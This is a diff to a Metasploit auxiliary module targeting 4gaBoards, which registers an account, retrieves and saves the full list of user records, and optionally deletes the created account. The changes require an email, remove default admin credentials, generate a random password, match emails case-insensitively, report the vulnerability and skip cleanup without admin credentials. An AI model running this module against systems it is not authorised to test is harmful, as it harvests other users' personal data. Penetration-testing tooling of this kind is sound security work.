@@ -47,9 +47,9 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'Base path to the 4gaBoards installation', '/']),
-        OptString.new('EMAIL', [false, 'Email for account creation', 'test@test.com']),
-        OptString.new('ADMIN_USERNAME', [false, 'Administrator username for cleanup', 'demo']),
-        OptString.new('ADMIN_PASSWORD', [false, 'Administrator password for cleanup', 'demo'])
+        OptString.new('EMAIL', [true, 'Email for account creation', 'test@test.com']),
+        OptString.new('ADMIN_USERNAME', [false, 'Administrator username for cleanup']),
+        OptString.new('ADMIN_PASSWORD', [false, 'Administrator password for cleanup'])
       ]
     )
   end
@@ -69,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
       },
       'data' => {
         'email' => datastore['EMAIL'],
-        'password' => 'Password@123!',
+        'password' => Faker::Internet.password(min_length: 16, mix_case: true, special_characters: true),
         'name' => 'test',
         'policy' => true
       }.to_json
@@ -115,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
         if json_data.key?('items')
           infos = json_data['items']
           for user in infos do
-            if user['email'] == datastore['EMAIL']
+            if user['email']&.casecmp?(datastore['EMAIL'])
               del_id = user['id'] # Storing the newly created user's ID to help with account deletion later
             end
           end
@@ -127,6 +127,8 @@ class MetasploitModule < Msf::Auxiliary
             JSON.pretty_generate(infos)
           )
           print_good("Users information saved to: #{path}")
+          report_service(host: rhost, port: rport, proto: 'tcp', name: ssl ? 'https' : 'http')
+          report_vuln(host: rhost, port: rport, proto: 'tcp', name: fullname, refs: references, info: description.strip)
         else
           fail_with(Failure::NoAccess, 'Users information not found in response')
         end
@@ -135,6 +137,11 @@ class MetasploitModule < Msf::Auxiliary
       end
     else
       fail_with(Failure::Unreachable, 'Failed to retrieve users information')
+    end
+    unless datastore['ADMIN_USERNAME'].present? && datastore['ADMIN_PASSWORD'].present?
+      print_warning('Administrator credentials not provided')
+      print_warning("User '#{datastore['EMAIL']}' not deleted")
+      return
     end
     print_status("Attempting to delete user '#{datastore['EMAIL']}'")
     print_status('Logging in as administrator')
